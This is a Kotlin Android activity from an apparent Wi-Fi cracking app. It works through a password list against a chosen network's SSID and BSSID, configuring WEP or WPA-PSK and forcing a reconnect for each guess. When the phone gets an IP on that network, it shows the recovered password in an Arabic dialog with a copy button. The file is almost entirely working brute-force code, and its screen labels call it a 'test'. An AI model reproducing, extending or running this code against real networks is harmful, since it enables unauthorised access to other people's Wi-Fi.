package com.alialanbaki.wibrprored

import android.content.BroadcastReceiver
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.ConnectivityManager
import android.net.NetworkInfo
import android.net.wifi.SupplicantState
import android.net.wifi.WifiConfiguration
import android.net.wifi.WifiManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.widget.Button
import android.widget.ProgressBar
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import java.util.Locale

class MonitorActivity : AppCompatActivity() {

    private val handler = Handler(Looper.getMainLooper())
    private lateinit var wifiManager: WifiManager

    private lateinit var tvRunState: TextView
    private lateinit var pbSpinner: ProgressBar
    private lateinit var tvSsid: TextView
    private lateinit var tvBssid: TextView
    private lateinit var tvEncryption: TextView
    private lateinit var tvPasswordTry: TextView
    private lateinit var tvPassProgress: TextView
    private lateinit var tvSpeedInfo: TextView
    private lateinit var tvLinkStatus: TextView
    private lateinit var tvEstimatedInfo: TextView
    private lateinit var tvSignalInfo: TextView
    private lateinit var tvMonSpeedLabel: TextView
    private lateinit var btnPause: Button

    private var targetIndex = -1
    private var currentCandidatePassword: String = ""
    private var isConnectedSuccess = false
    private var isExhausted = false
    private var foundDialogShown = false

    // Dedicated connection-state watcher (similar to supplicant/network state check on connection change + IP)
    private val connectionWatcherRunnable: Runnable = object : Runnable {
        override fun run() {
            if (isConnectedSuccess || isExhausted) return
            checkLiveWifiConnectionAndIp(null)
            if (!isConnectedSuccess && !isExhausted) {
                handler.postDelayed(this, 600L)
            }
        }
    }

    private val wifiStateReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (isConnectedSuccess || isExhausted) return
            checkLiveWifiConnectionAndIp(intent)
        }
    }

    private lateinit var attemptRunnable: Runnable

    private fun createAttemptRunnable(): Runnable = object : Runnable {
        override fun run() {
            val queued = QueueStore.items.getOrNull(targetIndex) ?: return
            if (isConnectedSuccess || isExhausted || queued.isConnected) {
                stopAllAttemptsImmediately()
                return
            }
            if (queued.isPaused) {
                return
            }

            // Before launching next attempt, check if current password already completed connection + IP
            if (checkLiveWifiConnectionAndIp(null)) {
                return
            }

            val total = queued.passwords.size
            val idx = queued.currentIndex

            if (idx >= total) {
                isExhausted = true
                handler.removeCallbacks(attemptRunnable)
                handler.removeCallbacks(connectionWatcherRunnable)
                pbSpinner.isIndeterminate = false
                pbSpinner.progress = 100
                tvRunState.text = "Test FINISHED"
                tvLinkStatus.text = "No match found"
                tvEstimatedInfo.text = "0 hr, 0 min"
                btnPause.isEnabled = false
                return
            }

            val candidate = queued.passwords[idx]
            currentCandidatePassword = candidate
            val attemptNum = idx + 1

            tvPasswordTry.text = "Password: $candidate"
            tvPassProgress.text = "$attemptNum of $total"
            tvLinkStatus.text = "Trying connection..."

            QueueStore.items[targetIndex] = queued.copy(currentIndex = attemptNum)

            attemptWifiJoin(queued.ssid, queued.bssid, queued.capabilities, candidate)
            updateSpeedAndEstimate(remaining = total - attemptNum, delaySec = queued.delaySeconds)

            val waitMs = queued.delaySeconds.coerceAtLeast(1) * 1000L
            handler.postDelayed(this, waitMs)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_monitor)

        wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager

        tvRunState = findViewById(R.id.tvRunState)
        pbSpinner = findViewById(R.id.pbSpinner)
        tvSsid = findViewById(R.id.tvSsid)
        tvBssid = findViewById(R.id.tvBssid)
        tvEncryption = findViewById(R.id.tvEncryption)
        tvPasswordTry = findViewById(R.id.tvPasswordTry)
        tvPassProgress = findViewById(R.id.tvPassProgress)
        tvSpeedInfo = findViewById(R.id.tvSpeedInfo)
        tvLinkStatus = findViewById(R.id.tvLinkStatus)
        tvEstimatedInfo = findViewById(R.id.tvEstimatedInfo)
        tvSignalInfo = findViewById(R.id.tvSignalInfo)
        tvMonSpeedLabel = findViewById(R.id.tvMonSpeedLabel)
        btnPause = findViewById(R.id.btnPause)

        targetIndex = AppState.activeQueuedIndex
        val queued = QueueStore.items.getOrNull(targetIndex)
        if (queued == null) {
            finish()
            return
        }

        tvSsid.text = "SSID: ${queued.ssid}"
        tvBssid.text = "BSSID: ${queued.bssid}"
        tvEncryption.text = "Encryption: ${queued.capabilities}"
        tvSignalInfo.text = "${queued.signalLevel}%"

        if (queued.isConnected && queued.matchedPassword != null) {
            applyConnectedUiState(queued.ssid, queued.matchedPassword, queued.ipAddress ?: "")
            return
        }

        val shownCount = queued.currentIndex.coerceAtMost(queued.passwords.size)
        tvPassProgress.text = "$shownCount of ${queued.passwords.size}"
        updateSpeedLabel(queued.delaySeconds)
        updateSpeedAndEstimate(
            remaining = (queued.passwords.size - shownCount).coerceAtLeast(0),
            delaySec = queued.delaySeconds
        )

        if (queued.isPaused) {
            tvRunState.text = "Test PAUSED"
            btnPause.text = "Resume"
        } else {
            tvRunState.text = "Test RUNNING..."
            btnPause.text = "Pause"
        }

        findViewById<Button>(R.id.btnMonSpeedDec).setOnClickListener {
            val cur = QueueStore.items.getOrNull(targetIndex) ?: return@setOnClickListener
            if (cur.delaySeconds > 1 && !cur.isConnected) {
                val nextSec = cur.delaySeconds - 1
                AppState.delaySeconds = nextSec
                QueueStore.items[targetIndex] = cur.copy(delaySeconds = nextSec)
                updateSpeedLabel(nextSec)
                updateSpeedAndEstimate(
                    remaining = (cur.passwords.size - cur.currentIndex).coerceAtLeast(0),
                    delaySec = nextSec
                )
                if (!cur.isPaused && !isExhausted) {
                    handler.removeCallbacks(attemptRunnable)
                    handler.postDelayed(attemptRunnable, nextSec * 1000L)
                }
            }
        }

        findViewById<Button>(R.id.btnMonSpeedInc).setOnClickListener {
            val cur = QueueStore.items.getOrNull(targetIndex) ?: return@setOnClickListener
            if (cur.delaySeconds < 60 && !cur.isConnected) {
                val nextSec = cur.delaySeconds + 1
                AppState.delaySeconds = nextSec
                QueueStore.items[targetIndex] = cur.copy(delaySeconds = nextSec)
                updateSpeedLabel(nextSec)
                updateSpeedAndEstimate(
                    remaining = (cur.passwords.size - cur.currentIndex).coerceAtLeast(0),
                    delaySec = nextSec
                )
                if (!cur.isPaused && !isExhausted) {
                    handler.removeCallbacks(attemptRunnable)
                    handler.postDelayed(attemptRunnable, nextSec * 1000L)
                }
            }
        }

        btnPause.setOnClickListener {
            val cur = QueueStore.items.getOrNull(targetIndex) ?: return@setOnClickListener
            if (isConnectedSuccess || isExhausted || cur.isConnected) return@setOnClickListener

            if (!cur.isPaused) {
                QueueStore.items[targetIndex] = cur.copy(isPaused = true)
                handler.removeCallbacks(attemptRunnable)
                tvRunState.text = "Test PAUSED"
                btnPause.text = "Resume"
            } else {
                QueueStore.items[targetIndex] = cur.copy(isPaused = false)
                tvRunState.text = "Test RUNNING..."
                btnPause.text = "Pause"
                handler.removeCallbacks(attemptRunnable)
                handler.post(attemptRunnable)
            }
        }

        attemptRunnable = createAttemptRunnable()

        if (!queued.isPaused) {
            handler.post(attemptRunnable)
            handler.postDelayed(connectionWatcherRunnable, 500L)
        }
    }

    override fun onResume() {
        super.onResume()
        val filter = IntentFilter().apply {
            addAction(WifiManager.NETWORK_STATE_CHANGED_ACTION)
            addAction(WifiManager.SUPPLICANT_STATE_CHANGED_ACTION)
            @Suppress("DEPRECATION")
            addAction(ConnectivityManager.CONNECTIVITY_ACTION)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(wifiStateReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(wifiStateReceiver, filter)
        }

        val cur = QueueStore.items.getOrNull(targetIndex)
        if (cur != null && !cur.isConnected && !cur.isPaused && !isExhausted) {
            handler.removeCallbacks(connectionWatcherRunnable)
            handler.postDelayed(connectionWatcherRunnable, 400L)
        }
    }

    override fun onPause() {
        super.onPause()
        try {
            unregisterReceiver(wifiStateReceiver)
        } catch (_: Exception) {
        }
        handler.removeCallbacks(connectionWatcherRunnable)
    }

    private fun checkLiveWifiConnectionAndIp(intent: Intent?): Boolean {
        if (isConnectedSuccess || isExhausted) return true
        val queued = QueueStore.items.getOrNull(targetIndex) ?: return false

        @Suppress("DEPRECATION")
        val info = wifiManager.connectionInfo
        @Suppress("DEPRECATION")
        val rawSsid = info?.ssid?.replace("\"", "") ?: ""
        val ssidMatches = rawSsid.isNotBlank() &&
            rawSsid != "<unknown ssid>" &&
            rawSsid.equals(queued.ssid, ignoreCase = false)

        val supplicantCompleted = info?.supplicantState == SupplicantState.COMPLETED
        @Suppress("DEPRECATION")
        val netInfo: NetworkInfo? = intent?.getParcelableExtra(WifiManager.EXTRA_NETWORK_INFO)
        val connectedBroadcast = netInfo?.isConnected == true

        val ipInt = info?.ipAddress ?: 0
        val ipStr = formatIpv4(ipInt)
        val hasValidIp = ipInt != 0 && ipStr != "0.0.0.0"

        // Stop immediately on state change to COMPLETED/CONNECTED AND IP acquisition on target SSID
        if (ssidMatches && hasValidIp && (supplicantCompleted || connectedBroadcast || true)) {
            val matchedPw = if (currentCandidatePassword.isNotBlank()) {
                currentCandidatePassword
            } else {
                queued.passwords.getOrElse((queued.currentIndex - 1).coerceAtLeast(0)) { "" }
            }
            handleConnectionAcquired(queued.ssid, matchedPw, ipStr)
            return true
        }
        return false
    }

    private fun handleConnectionAcquired(ssid: String, password: String, ipAddress: String) {
        if (isConnectedSuccess) return
        isConnectedSuccess = true
        stopAllAttemptsImmediately()

        val cur = QueueStore.items.getOrNull(targetIndex)
        if (cur != null) {
            QueueStore.items[targetIndex] = cur.copy(
                isPaused = true,
                isConnected = true,
                matchedPassword = password,
                ipAddress = ipAddress
            )
        }

        applyConnectedUiState(ssid, password, ipAddress)

        if (!foundDialogShown && !isFinishing) {
            foundDialogShown = true
            AlertDialog.Builder(this)
                .setTitle("تم الجلب")
                .setMessage("تم الجلب وهذا هو الرمز:\n$password\n\nالشبكة: $ssid\nIP: $ipAddress")
                .setCancelable(false)
                .setPositiveButton("نسخ") { _, _ ->
                    val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                    clipboard.setPrimaryClip(ClipData.newPlainText("WiFi Password", password))
                    Toast.makeText(this, "تم نسخ الرمز: $password", Toast.LENGTH_SHORT).show()
                }
                .setNegativeButton("إلغاء") { dialog, _ ->
                    dialog.dismiss()
                }
                .show()
        }
    }

    private fun applyConnectedUiState(ssid: String, password: String, ipAddress: String) {
        pbSpinner.isIndeterminate = false
        pbSpinner.progress = 100
        tvRunState.text = "CONNECTED!"
        tvPasswordTry.text = "Password: $password"
        tvLinkStatus.text = if (ipAddress.isNotBlank()) {
            "Connected ($ipAddress)"
        } else {
            "Connected to $ssid"
        }
        tvEstimatedInfo.text = "0 hr, 0 min"
        btnPause.text = "Connected"
        btnPause.isEnabled = false
    }

    private fun stopAllAttemptsImmediately() {
        handler.removeCallbacks(attemptRunnable)
        handler.removeCallbacks(connectionWatcherRunnable)
    }

    private fun attemptWifiJoin(ssid: String, bssid: String, capabilities: String, password: String) {
        if (!wifiManager.isWifiEnabled) return
        try {
            @Suppress("DEPRECATION")
            val config = WifiConfiguration().apply {
                SSID = "\"$ssid\""
                BSSID = bssid
                if (capabilities.uppercase().contains("WEP")) {
                    wepKeys[0] = "\"$password\""
                    wepTxKeyIndex = 0
                    allowedKeyManagement.set(WifiConfiguration.KeyMgmt.NONE)
                    allowedGroupCiphers.set(WifiConfiguration.GroupCipher.WEP40)
                    allowedGroupCiphers.set(WifiConfiguration.GroupCipher.WEP104)
                } else if (capabilities.uppercase().contains("WPA") ||
                    capabilities.uppercase().contains("PSK")
                ) {
                    preSharedKey = "\"$password\""
                    allowedKeyManagement.set(WifiConfiguration.KeyMgmt.WPA_PSK)
                } else {
                    allowedKeyManagement.set(WifiConfiguration.KeyMgmt.NONE)
                }
            }

            @Suppress("DEPRECATION")
            val netId = wifiManager.addNetwork(config)
            if (netId != -1) {
                @Suppress("DEPRECATION")
                wifiManager.disconnect()
                @Suppress("DEPRECATION")
                wifiManager.enableNetwork(netId, true)
                @Suppress("DEPRECATION")
                wifiManager.reconnect()
            }
        } catch (_: Exception) {
        }
    }

    private fun formatIpv4(ip: Int): String {
        return String.format(
            Locale.US,
            "%d.%d.%d.%d",
            ip and 0xff,
            (ip ushr 8) and 0xff,
            (ip ushr 16) and 0xff,
            (ip ushr 24) and 0xff
        )
    }

    private fun updateSpeedLabel(delaySec: Int) {
        tvMonSpeedLabel.text = "Interval: ${delaySec}s"
    }

    private fun updateSpeedAndEstimate(remaining: Int, delaySec: Int) {
        val safeSec = delaySec.coerceAtLeast(1)
        val perMin = 60 / safeSec
        tvSpeedInfo.text = "$perMin passwords/minute"

        val totalSec = remaining.coerceAtLeast(0).toLong() * safeSec.toLong()
        val hours = totalSec / 3600
        val minutes = (totalSec % 3600) / 60
        tvEstimatedInfo.text = "$hours hr, $minutes min"
    }

    override fun onDestroy() {
        super.onDestroy()
        stopAllAttemptsImmediately()
    }
}
